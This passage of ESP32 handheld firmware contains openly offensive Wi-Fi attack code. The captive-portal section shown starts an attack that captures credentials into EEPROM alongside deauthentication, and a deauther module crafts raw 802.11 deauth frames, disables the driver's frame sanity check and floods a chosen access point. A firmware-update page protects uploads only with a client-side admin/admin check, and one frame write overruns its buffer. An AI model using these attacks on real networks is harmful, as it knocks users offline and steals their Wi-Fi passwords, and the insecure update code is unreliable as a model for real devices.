           cpCloneExistingAPFlow();
           animationState = 0;
           activeIcon = -1;
          break;

         case 5:
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;

    case 4: break;
    case 5: break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
     if (currentScreen == KEYBOARD) {
      handleKeyboard(x, y);
    } else if (currentScreen == CRED_LIST) {
      handleCredList(x, y);
    } else {
      handleMainMenu(x, y);
    }

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 5) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void cportalSetup() {

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();

  EEPROM.begin(EEPROM_SIZE);
  int count = EEPROM.read(COUNT_ADDR);
  if (count > MAX_CREDS || count < 0) {
    Serial.println("Invalid credential count, resetting to 0");
    EEPROM.write(COUNT_ADDR, 0);
    EEPROM.commit();
  }
  loadSSID();

  startAttack();

  drawMainMenu();
  setupTouchscreen();
}

void cportalLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  updateStatusBar();
  runUI();

  if (attackActive) {
    dnsServer.processNextRequest();
    server.handleClient();

    unsigned long now = millis();
    if (cp_deauth_active && now - cp_last_deauth_time >= 50) {
      cpSendDeauthFrame();
      cp_last_deauth_time = now;
    }
  }

  if (currentScreen == KEYBOARD) {
    unsigned long now = millis();
    if (now - lastCursorToggle >= 500) {
      cursorState = !cursorState;
      lastCursorToggle = now;
      drawInputField();
      }
    }
  }
}

namespace Deauther {

#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320

uint8_t deauth_frame_default[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00,
    0x01, 0x00
};
uint8_t deauth_frame[sizeof(deauth_frame_default)];

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
bool attack_running = false;
wifi_ap_record_t selectedAp;
uint8_t selectedChannel;
int selected_ap_index = -1;
int network_count = 0;
wifi_ap_record_t *ap_list = nullptr;
bool scanning = false;
uint32_t last_packet_time = 0;
int current_page = 0;
const int networks_per_page = 14;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    packet_count++;
    if (res == ESP_OK) {
        success_count++;
        consecutive_failures = 0;
    } else {
        consecutive_failures++;

    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    deauth_frame[26] = 7;

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
}

int compare_ap(const void *a, const void *b) {
    wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
    wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
    return ap2->rssi - ap1->rssi;
}

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {

    FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                             : FeatureUI::ButtonStyle::Secondary;
    FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {

    tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

    if (leftButton[0]) {
        drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
    }

    if (prevButton[0]) {
        drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
    }
    if (nextButton[0]) {
        drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
    }
}

void drawScanScreen() {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);

    if (scanning) {
        tft.setCursor(10, 50);
        tft.setTextColor(GREEN);
        tft.println("Scanning...");
        loading(100, ORANGE, 0, 0, 3, true);
        tft.setCursor(10, 65);
        tft.println("Wait a moment.");
        return;
    }

    if (network_count == 0) {
        tft.setTextColor(GREEN);
        tft.setCursor(10, 50);
        tft.println("No networks found.");
        tft.setCursor(10, 65);
        tft.println("Press Rescan.");
    } else {
        int y = 50;
        tft.setTextColor(GREEN);
        tft.setCursor(10, y);
        tft.println("Networks:");
        y += 20;

        int start_index = current_page * networks_per_page;
        int end_index = min(start_index + networks_per_page, network_count);

        for (int i = start_index; i < end_index && y < 300; i++) {
            char buf[64];
            char ssid[12];
            strncpy(ssid, (char*)ap_list[i].ssid, 11);
            ssid[11] = '\0';
            if (strlen((char*)ap_list[i].ssid) > 11) strcat(ssid, "...");
            const char* enc = ap_list[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
            snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, ap_list[i].rssi, ap_list[i].primary, enc);
            tft.setCursor(10, y);
            tft.setTextColor(i == selected_ap_index ? ORANGE : (ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
            tft.println(buf);
            y += 15;
        }

        char page_buf[20];
        snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, (network_count + networks_per_page - 1) / networks_per_page);
        tft.setCursor(180, 50);
        tft.setTextColor(GREEN);
        tft.println(page_buf);
    }

    const char* leftButton = attack_running ? "Stop Attack" : "Rescan";
    bool leftDisabled = false;
    const char* prevButton = "Prev";
    bool prevDisabled = attack_running || current_page == 0;
    const char* nextButton = "Next";
    bool nextDisabled = attack_running || (current_page + 1) * networks_per_page >= network_count;
    drawTabBar(leftButton, leftDisabled, prevButton, prevDisabled, nextButton, nextDisabled);
}

bool scanNetworks() {
    scanning = true;
    current_page = 0;
    drawScanScreen();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    network_count = WiFi.scanNetworks();
    if (network_count == 0) {
        scanning = false;
        return false;
    }

    if (ap_list) free(ap_list);
    ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
    if (!ap_list) {
        scanning = false;
        return false;
    }

    for (int i = 0; i < network_count; i++) {
        wifi_ap_record_t ap_record = {0};
        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
        ap_record.rssi = WiFi.RSSI(i);
        ap_record.primary = WiFi.channel(i);
        ap_record.authmode = WiFi.encryptionType(i);
        ap_list[i] = ap_record;
    }

    qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);

    scanning = false;
    return true;
}

bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
            *channel = WiFi.channel(i);
            WiFi.mode(WIFI_AP);
            delay(100);
            return true;
        }
    }

    WiFi.mode(WIFI_AP);
    delay(100);
    return false;
}

void resetWifi() {
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    packet_count = 0;
    success_count = 0;
    consecutive_failures = 0;
}

void drawAttackScreen() {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);

    char buf[64];
    tft.setTextColor(WHITE);
    snprintf(buf, sizeof(buf), "Target: %s", selectedAp.ssid);
    tft.setCursor(10, 50);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
             selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
    tft.setCursor(10, 70);
    tft.println(buf);

    const char* auth;
    switch (selectedAp.authmode) {
        case WIFI_AUTH_OPEN: auth = "OPEN"; break;
        case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
        case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2-PSK"; break;
        default: auth = "Unknown"; break;
    }
    snprintf(buf, sizeof(buf), "Auth: %s", auth);
    tft.setCursor(10, 85);
    tft.println(buf);

    tft.setCursor(10, 100);
    tft.setTextColor(attack_running ? ORANGE : DARK_GRAY);
    tft.println(attack_running ? "Status: Running" : "Status: Stopped");

    snprintf(buf, sizeof(buf), "Packets: %u", packet_count);
    tft.setCursor(10, 115);
    tft.setTextColor(WHITE);
    tft.println(buf);

    float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
    snprintf(buf, sizeof(buf), "Success: %.2f%%", success_rate);
    tft.setCursor(10, 130);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
    tft.setCursor(10, 145);
    tft.println(buf);

    const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
    drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

void handleTouch() {
    int x, y;
    if (!readTouchXY(x, y)) return;

    bool redraw = false;
    if (selected_ap_index == -1) {
        if (!scanning && y >= 60 && y < 270 && network_count > 0) {
            int index = (y - 60) / 15 + (current_page * networks_per_page);
            if (index >= 0 && index < network_count) {
                selected_ap_index = index;
                selectedAp = ap_list[index];
                selectedChannel = ap_list[index].primary;
                drawScanScreen();
                delay(50);
                drawAttackScreen();
            }
        } else if (!scanning && y >= 290 && y <= 320) {
            if (attack_running) {
                if (x >= 0 && x <= 57) {
                    drawButton(0, 304, 57, 16, "Stop Attack", true, false);
                    attack_running = false;
                    last_packet_time = 0;
                    drawScanScreen();
                    delay(50);
                    redraw = true;
                } else if (x >= 122 && x <= 179) {
                    drawButton(122, 304, 57, 16, "Rescan", true, false);
                    delay(50);
                    if (scanNetworks()) {
                        drawScanScreen();
                    }
                    redraw = true;
                }
            } else {
                if (x >= 0 && x <= 57) {
                    drawButton(0, 304, 57, 16, "Rescan", true, false);
                    delay(50);
                    if (scanNetworks()) {
                        drawScanScreen();
                    }
                    redraw = true;
                } else if (x >= 122 && x <= 179) {
                    if (current_page > 0) {
                        drawButton(117, 304, 57, 16, "Prev", true, false);
                        current_page--;
                        drawScanScreen();
                        delay(50);
                        redraw = true;
                    }
                } else if (x >= 183 && x <= 240) {
                    if ((current_page + 1) * networks_per_page < network_count) {
                        drawButton(178, 304, 57, 16, "Next", true, false);
                        current_page++;
                        drawScanScreen();
                        delay(50);
                        redraw = true;
                    }
                }
            }
        }
    } else {
        if (y >= 290 && y <= 320) {
            if (x >= 0 && x <= 57) {
                drawButton(0, 304, 57, 16, attack_running ? "Stop" : "Start", true, false);
                attack_running = !attack_running;
                if (!attack_running) {
                    last_packet_time = 0;
                }
                drawAttackScreen();
                delay(50);
                redraw = true;
            } else if (x >= 183 && x <= 240) {
                drawButton(177, 304, 57, 16, "Back", true, false);
                attack_running = false;
                last_packet_time = 0;
                selected_ap_index = -1;
                drawScanScreen();
                delay(50);
                redraw = true;
            }
        }
    }

    if (redraw) {
        delay(100);
    }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          scanNetworks();
          delay(50);
          if (scanNetworks()) {
            drawScanScreen();
           }
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 1) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void deautherSetup() {

    tft.fillRect(0, 37, 240, 320, TFT_BLACK);

    setupTouchscreen();
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
    runUI();

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    tft.setTextColor(GREEN, BLACK);
    tft.setTextSize(1);
    tft.setCursor(10, 50);
    tft.println("Initializing...");

    attack_running     = false;
    selected_ap_index  = -1;
    current_page       = 0;
    scanning           = false;

    int bgCount = WiFi.scanComplete();
    if (bgCount > 0) {

        if (ap_list) {
            free(ap_list);
            ap_list = nullptr;
        }

        network_count = bgCount;
        ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
        if (ap_list) {
            for (int i = 0; i < network_count; i++) {
                wifi_ap_record_t ap_record = {0};
                memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
                strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
                ap_record.ssid[sizeof(ap_record.ssid) - 1] = '\0';
                ap_record.rssi    = WiFi.RSSI(i);
                ap_record.primary = WiFi.channel(i);
                ap_record.authmode = WiFi.encryptionType(i);
                ap_list[i] = ap_record;
            }

            qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);
        } else {

            network_count = 0;
        }
    } else {

        scanNetworks();
    }

    drawScanScreen();

    drawScanScreen();
}

void deautherLoop() {

    if (feature_active && isButtonPressed(BTN_SELECT)) {
        feature_exit_requested = true;
        return;
    }

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    handleTouch();
    updateStatusBar();
    runUI();

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    uint32_t current_time = millis();
    if (attack_running && selected_ap_index != -1) {
        uint32_t heap = ESP.getFreeHeap();
        if (heap < 80000) {
            attack_running = false;
            last_packet_time = 0;
            drawAttackScreen();
            delay(3000);
            return;
        }

        if (consecutive_failures > 10) {
            resetWifi();
            last_packet_time = 0;
            delay(3000);
            return;
        }

        if (current_time - last_packet_time >= 100 && attack_running) {
            wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
            last_packet_time = current_time;
        }
    }

    static uint32_t last_channel_check = 0;
    if (attack_running && current_time - last_channel_check > 15000) {
        uint8_t new_channel;
        if (checkApChannel(selectedAp.bssid, &new_channel)) {
            if (new_channel != selectedChannel) {
                selectedChannel = new_channel;
                wifi_config_t ap_config = {0};
                strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen("ESP32-DIV");
                strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
                ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
                ap_config.ap.ssid_hidden = 0;
                ap_config.ap.max_connection = 4;
                ap_config.ap.beacon_interval = 100;
                ap_config.ap.channel = selectedChannel;
                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

            }
        }
        last_channel_check = current_time;
    }

    static uint32_t last_status_time = 0;
    if (attack_running && current_time - last_status_time > 2000) {
        drawAttackScreen();
        last_status_time = current_time;
      }
  }
}

namespace FirmwareUpdate {

#define FIRMWARE_FILE "/firmware.bin"

const char* host = "esp32";

#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320

#define BUTTON_WIDTH 230
#define BUTTON_HEIGHT 20
#define BUTTON1_X 5
#define BUTTON1_Y 50
#define BUTTON2_X 5
#define BUTTON2_Y 80

#define TAB_BUTTON_WIDTH 57
#define TAB_BUTTON_HEIGHT 16
#define TAB_LEFT_X 0
#define TAB_MIDDLE_X 117
#define TAB_RIGHT_X 177
#define TAB_Y 304

#define TS_MIN_X 300
#define TS_MAX_X 3800
#define TS_MIN_Y 300
#define TS_MAX_Y 3800

#define NETWORKS_PER_PAGE 15
#define NETWORK_Y_START 70
#define NETWORK_ROW_HEIGHT 15

#define PASSWORD_MAX_LENGTH 32
#define KEY_WIDTH 20
#define KEY_HEIGHT 20
#define KEY_SPACING 2
#define KEYBOARD_Y_OFFSET_START 60

WebServer server(80);

char selectedSSID[32] = "";
char wifiPassword[PASSWORD_MAX_LENGTH + 1] = "";

typedef struct {
  char ssid[32];
  int8_t rssi;
  uint8_t channel;
  uint8_t authmode;
} NetworkInfo;

const char* keyboardLayout[] = {
  "1234567890",
  "QWERTYUIOP",
  "ASDFGHJKL",
  "ZXCVBNM!@#"
};

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled);
void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled);
void drawMenu();
bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH);
static void waitForTouchXY(int& x, int& y);
void performSDUpdate();
void drawNetworkList(int, int, NetworkInfo*, int);
bool selectWiFiNetwork();
void drawInputField();
void drawKeyboard();
bool enterWiFiPassword();
void performWebOTAUpdate();

const char* loginIndex = R"(
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>ESP32 Login Page</title>
    <style>
        body {
            background-color: #1A1A1A;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2A2A2A;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            color: #FFFFFF;
        }
        .form-group {
            margin-bottom: 1.5rem;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 1rem;
            color: #E0E0E0;
        }
        input[type='text'],
        input[type='password'] {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #4A4A4A;
            border-radius: 5px;
            background-color: #3A3A3A;
            color: #E0E0E0;
            font-size: 1rem;
            box-sizing: border-box;
        }
        input[type='submit'] {
            width: 100%;
            padding: 0.8rem;
            border: none;
            border-radius: 5px;
            background-color: #FFE221;
            color: #1A1A1A;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='submit']:hover {
            background-color: #FFF14A;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h2>ESP32 Login Page</h2>
        <form name='loginForm'>
            <div class='form-group'>
                <label for='userid'>Username:</label>
                <input type='text' name='userid' id='userid'>
            </div>
            <div class='form-group'>
                <label for='pwd'>Password:</label>
                <input type='password' name='pwd' id='pwd'>
            </div>
            <input type='submit' onclick='check(this.form); return false;' value='Login'>
        </form>
    </div>
    <script>
        function check(form) {
            if (form.userid.value == 'admin' && form.pwd.value == 'admin') {
                window.open('/serverIndex');
            } else {
                alert('Error Password or Username');
            }
        }
    </script>
</body>
</html>
)";

const char* serverIndex = R"(
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>ESP32 Firmware Update</title>
    <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
    <style>
        body {
            background-color: #1A1A1A;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2A2A2A;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            color: #FFFFFF;
        }
        .form-group {
            margin-bottom: 1.5rem;
        }
        input[type='file'] {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #4A4A4A;
            border-radius: 5px;
            background-color: #3A3A3A;
            color: #E0E0E0;
            font-size: 1rem;
            box-sizing: border-box;
            cursor: pointer;
        }
        input[type='file']::-webkit-file-upload-button {
            background-color: #4A4A4A;
            color: #E0E0E0;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='file']::-webkit-file-upload-button:hover {
            background-color: #5A5A5A;
        }
        input[type='submit'] {
            width: 100%;
            padding: 0.8rem;
            border: none;
            border-radius: 5px;
            background-color: #FFE221;
            color: #1A1A1A;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='submit']:hover {
            background-color: #FFF14A;
        }
        #progress-container {
            margin-top: 1rem;
            width: 100%;
            background-color: #3A3A3A;
            border-radius: 5px;
            overflow: hidden;
        }
        #prg {
            width: 0%;
            height: 20px;
            background-color: #FFE221;
            text-align: center;
            line-height: 20px;
            color: #1A1A1A;
            border-radius: 5px;
            transition: width 0.3s ease-in-out;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h2>Firmware Update</h2>
        <form method='POST' action='#' enctype='multipart/form-data' id='upload_form'>
            <div class='form-group'>
                <input type='file' name='update'>
            </div>
            <input type='submit' value='Update'>
        </form>
        <div id='progress-container'>
            <div id='prg'>progress: 0%</div>
        </div>
    </div>
    <script>
        $('form').submit(function(e) {
            e.preventDefault();
            var form = $('#upload_form')[0];
            var data = new FormData(form);
            $.ajax({
                url: '/update',
                type: 'POST',
                data: data,
                contentType: false,
                processData: false,
                xhr: function() {
                    var xhr = new window.XMLHttpRequest();
                    xhr.upload.addEventListener('progress', function(evt) {
                        if (evt.lengthComputable) {
                            var per = evt.loaded / evt.total;
                            var percent = Math.round(per * 100);
                            $('#prg').css('width', percent + '%').text('progress: ' + percent + '%');
                        }
                    }, false);
                    return xhr;
                },
                success: function(d, s) {
                    console.log('success!');
                },
                error: function(a, b, c) {
                    console.log('error:', c);
                }
            });
        });
    </script>
</body>
</html>
)";

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 1

  static int iconX[ICON_NUM] = {10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
         case 0:
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              feature_exit_requested = true;
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {

  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {

  tft.fillRect(0, TAB_Y, SCREEN_WIDTH, TAB_BUTTON_HEIGHT, FEATURE_BG);

  if (leftButton[0]) {
    drawButton(TAB_LEFT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT, leftButton, false, leftDisabled);
  }
  if (prevButton[0]) {
    drawButton(TAB_MIDDLE_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT, prevButton, false, prevDisabled);
  }
  if (nextButton[0]) {
    drawButton(TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT, nextButton, false, nextDisabled);
  }
}

void drawMenu() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextSize(1);

  drawButton(BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "SD Update", false, false);
  drawButton(BUTTON2_X, BUTTON2_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "Web OTA", false, false);

}

bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH) {
  return (x > buttonX && x < buttonX + buttonW && y > buttonY && y < buttonY + buttonH);
}

static void waitForTouchXY(int& x, int& y) {
  while (!readTouchXY(x, y)) {
    delay(10);
  }

  delay(80);
}

int yshift = 40;

void performSDUpdate() {
  updateStatusBar();
  runUI();
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("SD Update");
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 30 + yshift);
  tft.println("Insert SD card with");
  tft.setCursor(10, 40 + yshift);
  tft.println("firmware.bin in root");
  tft.setCursor(10, 50 + yshift);
  tft.println("Touch Start to update");

  drawTabBar("Start", false, "", false, "Back", false);

  bool waitingForStart = true;

  while (waitingForStart) {
    int x, y;
    if (readTouchXY(x, y)) {
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
